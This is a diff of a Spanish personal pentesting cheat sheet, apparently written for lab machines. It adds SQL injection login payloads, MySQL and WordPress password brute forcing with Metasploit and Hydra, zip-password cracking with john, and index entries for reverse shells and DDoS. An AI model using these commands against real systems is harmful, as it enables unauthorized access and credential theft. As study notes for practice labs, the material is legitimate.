@@ -1,87 +1,3 @@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#++=======++#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+====++++******++==+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*===++**######%%%%###*+=+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#==++**#######%%%%%%%%%%%%#++*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+=++*##########%%%%%%@@@%%%%#++%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#==++#########++***###%%%@@@@%%#+=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#=++*#####**+++##%@@%%####%%@@@@%#*+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%=+*#####*+++*%@@@@@@@@@%%##%@@@@%#*+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+++#####+++#%@@@@@@@@@@@@@@@%##%@@@%#++@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@++*####*++#@@@@@@@@@@@@@@@@@@@@%#%@%%%#++@ @@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@%+**###*+#%@@@@@@@@@@@@@@@@@@@@@%#%@%%##+# @@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@*+*####+#@@@@@@@@@@@@@@@@@@@@@@@@##@%%%#*+ %@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@%%%@@@%++*###+#@@@@@@@@@@@@@@@@@@@@@@@@@@##@%%##+ #@@@@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@%@@@@@*++###+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@##%%%#* +%@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@#++*##*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##%%%# +#@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@@@@@+++##*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%##%# ++@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@@@*++***%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*# #=#@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%@@@#=+++#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+ *++%@@@@%%@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%@@@@%+=++#@@@@@@@@@%@@@@@@@@@@@@@@@@@@@%#@@@@@@@@@% *++*@@@@%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%@@@@@%*==+#@@@@@@@@@%=+%%@@@@@@@@@@@@@@%%*=+%@@@@@@@@@ @#==#%%@@@@%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#%@@@@@@#=+*%@@@@@@@@@@@%+==+#%@@@@@@@@@%*===*%@@@@@@@@@@ @@%++%@@@@@%@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%#%@@@@@%=+#@@@@@@@@@@@@@@%%%%@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@%++%@%%%%%%%#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%@@%  +%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@++%%%%%%####%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%+ #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@**%%##%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@%%%###%*#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@####%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%####@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*#%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%#+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*#%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+#%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%#+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+##%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%#+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@++*##%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%##**+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+==*#%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%####+=%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+*#=+#%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%#*+===*#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##@%*===+#%%%@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#+=======#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@%%%%###+=+#%@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#====+++***+#@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@%%%%%%#++===*%@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+==++**#######%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%####*++===#@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*==#***###%##%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@@@@@@@@@%%%%%%########++%@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#===*#####%%%%%%%%@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%@@@@@@@@@@@@@@@@@@%%%%%%%%%%#==*@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%==**+#%%%%%%%%%%%%@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%@@@@@@@@@@@@@@@@@@@@@%%%%@@@%%#+#+=#@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@==+#%**%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%@@@@@@@@@@@@@@@@@@@@@@@@%%@@@%@%##%%#*=%@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+++#%@%+%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@%@@%%#%%%#%#+%@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*+#*#%@@#*%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@%%%@@%%%%%%%@%*#@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+###%@@@%*%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@%%%@@@%%%%@%%@@#*%@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@%+*%##%@@@@##%@%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@%%%@@@%%%%%@%%@@%*#@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@++#%%#%@@@@%#%%%%%%%%%%%%%%%%%%@@@@%@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@%%%@@@@%%%%@%%@@@@#*@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@*+#%%%%%@@@@@%%@@%%%%%%%%%%%%%%%%%%@@%@%@@@@@@@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@%%%@@@@%%@@@#%@@@@%*#@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@#+#%%@%%%@@@@@%%%@%%%%@@@%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@%%%@@@@@@@%%@@@@@@@@%%@@@@@@#*@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@%+*#%@@%%%@@@@@%%%@%%%%%@@@@%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@%@%@%%%%%@@@@@%%%%%@@@@@@@%@@@@@@@@@@%%@@@@@@%*%@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@#+#%%@@%%%%@@@@%%%@@%%%%@@@@@@%%%%%%%%%%%%@@%%@@@@@@@@@@@@@@@%%@%%%%%%@@@@@@%%%%@@@@@@@@%@@@@@@@@@%%@@@@@@@%##@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@**%%@@@@%%%@@@@%%@@@%%%%@@@@@@@@@%%%%%%%%%@@@%%%@@@@@@@@@%@%%%%@%%%%@@@@@@@@%%%%@@@@@@@@@@@@@@@@%%@@@@@@@@@##@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@%+#%%@@@@%%%@@@@%%@@@@%%%%@@@@@@@@@@@@@%%%@@%%%%%%%%@%%@%%%%%%%@@@%@@@@@@@@@%%%@@@@@@@@@@@@@@@@@%%@@@@@@@@%#%@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@#+#%%@@@@@%%@@@@@%@@@@%%%%@@@@@@@@@@@@@@@@@@@%%@%%%%%%%%%%%%%%%%@@@@@@@@@@@%%%%%@@@@@@@@@@@@@@@@%%@@@@@@@@@@#%@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@#+*%%@@@@@@@%@@@@@%@@@@%%%%@@@@@@@@@@@@@@@@@@@@@%%@%%%%%%%%%%@@@%@@@@@@@@@@@@%%%@@@@@@@@@@@@@@@%%@@@@@@@@@@@%%@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@*+*##%@@@@@@@%@@@@@%@@@@%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@%@@%@@@@@@@@@@@@@@@@%%%%@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@%%@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@%**##%%%@@@@@@@%%@@@@@@@@@%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@%%@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@#**##%%%@@@@@@@@@%@@@@@@@@@%%%%@@@@@@@@@@@@@@@@@@@@%#==-==+%@@@@@@@@@@@@@@@@@%@ %%@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@%@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@####%%%%%@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@%=--------#@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@%@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@%##%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=----------@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@
-@@@@@@@@@@@@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-=*#+-=%%+-*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*-+%@%==@@#--%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#-----=*+------#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#==----------=+=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+@%#+------+#@##@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@%##+++=%%@@#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##+#*@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-
 Indice:
 
 1. arp-scan--------------------------------------------------------------------------------------------------------------------
@@ -89,7 +5,7 @@ Indice:
 3. Rutas wordpress peligrosas--------------------------------------------------------------------------------------------------
 4. base 64---------------------------------------------------------------------------------------------------------------------
 5. Reconocimiento y Ataque SQL-------------------------------------------------------------------------------------------------
-6. Inyecciones SQL en URL------------------------------------------------------------------------------------------------------
+6. Inyecciones SQL en URL y Maneras de conectarnos por MySQL-------------------------------------------------------------------
 7. Inyecciones de tiempo-------------------------------------------------------------------------------------------------------
 8. SQLMAP----------------------------------------------------------------------------------------------------------------------
 9. Type Jugling (ver si cambiando el texto podemos lograr burlar la comparativa)-----------------------------------------------
@@ -103,8 +19,13 @@ Indice:
 17. Buscar info en una imagen--------------------------------------------------------------------------------------------------
 18. DIRECTORY LISTING----------------------------------------------------------------------------------------------------------
 19. NETCAT   Y   ZIP-----------------------------------------------------------------------------------------------------------
+20. (  Hydra  ) Cracking Passwords Wordpress-----------------------------------------------------------------------------------
+21. (  WPScan  ) Cracking Passwords Wordpress----------------------------------------------------------------------------------
+22. reverseShell.php desde plugin en Wordpress.---------------------------------------------------------------------------------
 
-
+23. joomscan. -----------------------------------------------------------------------------------------------------------------
+24. DDoS  Ataque de Denegación de servicio ------------------------------------------------------------------------------------
+25. DDoS Herramienta overload de github ---------------------------------------------------------------------------------------
 
 1. arp-scan--------------------------------------------------------------------------------------------------------------------
 > arp-scan -I ens33 --localnet --ignoredups
@@ -192,6 +113,14 @@ SQL  -  URL   |----[ , , , ]--->
 /////////////
 INJECCION EN URL:
 
+-Ataque en campo de Login:
+  G: User:';-- -
+     Password:test
+
+  G: User:' OR 1=1;-- -   (Puede darnos acceso en caso de ser vulnerable)
+     Password:test
+
+
 -En URL el ataque de injección seria:
   G: http://<IP>/dashboard.php?id=1'      (Peta buena señal)
   G: http://<IP>/dashboard.php?id=1' order by 2-- -
@@ -205,9 +134,45 @@ INJECCION EN URL:
 
     -Podemos automatizar las inyecciones con SQLMAP
 
+
+
+MANERAS DE CONECTARNOS POR MySQL : --------------------------------------------------------------------
+
+---> MANERA 1: (Normal)
+
+-Nos conectaremos con mysql:
+>www-data@aragog:$> mysql -u root -p -h 10.0.2.12
+>Password:  mySecr3tPass (En este caso ya dimos con la contraseña, pero en caso de NO TENERLA, podemos probar : vacio y dando a ENTER o con password, root, admin, admin123..)
+>MariaDB >   
+>  
+
+
+
+Fuerza Bruta (solo tenemos user, sin password):
+---> MANERA 2: Desde msfconsole:
+
+> $ msfconsole
+> msf6 > search mysql_login
+     0    auxiliary/sccanner/mysql/mysql_login
+> msf6 > use 0
+> msf6 > set verbose false
+> msf6 > set rhosts 10.0.2.12    (victima)
+> msf6 > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+> msf6 > run
+
+
+
+---> MANERA 3:  Con Hydra
+> $ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt mysql://10.0.2.12
+
+
+
+
+
+
 7. Inyecciones de tiempo---------------------------------------------------------------------------------------------------------------
 -INJECCION DE TIEMPO:
-  G: http://<IP>/dashboard.php?id=1 and sleep(10)        (Si tarda en carga es vulnerable)
+  G: http://<IP>/dashboard.php?id=1 and sleep(10)        (Si tarda en cargar es vulnerable)
                                     ^
 
 
@@ -488,7 +453,7 @@ que tratare de incluir será una reverse shell en php):
                                                            >script /dev/null -c bash
                                                               (Ctrl+Z)
                                                                   
-                                                                       >stty raw -echo; -fg
+                                                                       >stty raw -echo; fg
                                                                                     reset xterm
                                                    www-data:$>export TERM=xterm
                                                              >export SHELL=bash                  
@@ -542,7 +507,17 @@ Download: https://github.com/NationalSecurityAgency/ghidra
          oculto.txt   (Existe un archivo oculto)
    -Puedo extraerlo introduciendo la contraseña:
         >steghide extract -sf img.jpg
+            (Se extraen los archivos) -> backup.zip
+       -Descomprimimos el .zip:
+        > unzip backup.zip
             Contraseña: (Introduzco contraseña) (Extrae el archivo)
+
+    *(En caso de no conocer la contraseña):
+        > zip2john backup.zip > hash
+          (Crea el archivo hash, ahora trataremos de crakearlo con john)
+        > john --wordlist=/usr/share/wordlists/rockyou.txt hash
+           (Buscará la contraseña)
+
 ////////////////
 
 
@@ -580,3 +555,317 @@ NETCAT   Y   ZIP  :
  
 
 ////////////////////////////////////////
+
+
+
+
+
+20. (  Hydra  ) Cracking Passwords Wordpress----------------------------------------------------------------------------------
+ 
+Enlaces de interes de info:
+       https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/
+       https://www.nubetia.com/hydra-wordpress-ataque-fuerza-bruta/
+
+
+***
+Antes que cualquier cosa, es necesario entender como funciona Hydra. Básicamente Hydra funciona con el siguiente comando: 
+
+> hydra -L /diccionario/usuarios.txt -P /diccionario/contrasenas.txt sitiovictima.com  -V https-form-post ‘wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location’
+
+
+
+-L: quiere decir que utilizara el archivo de la lista de usuarios. Si pones la “L” minúscula “l” podrás poner el usuario (en caso de saber el usuario de la víctima).
+-P: quiere decir que utilizara el archivo de la lista de contraseñas.
+-V: quiere decir que estará en modo “vervose” pero como es mayúscula “-V” mostrara cada 1 de los intentos y solo te pondrá en verde el correcto. En caso de no querer ver la lista de todos los intentos poner la “-V” en minúscula así  “-v”.
+
+
+https-form-post: es 1 de los muchos diferentes servicios soportados y que hydra te permitirá atacar. 
+‘wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location’: es como el WordPress manda la info mediante el metodo POST de la pagina wp-login.php e intenta acceder al admin wp-admin.php.
+***
+
+
+
+-Creando un archivo de posibles usuarios en user.txt--------
+
+> nano user.txt
+-----------
+admin
+raul
+david
+juan
+user
+usuario
+prueba
+...
+-----------
+                                                                            (La ruta exacta la veremos interceptando la peticion del login con Burpsuite)
+> sudo hydra -L user.txt -p prueba 10.10.10.10 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
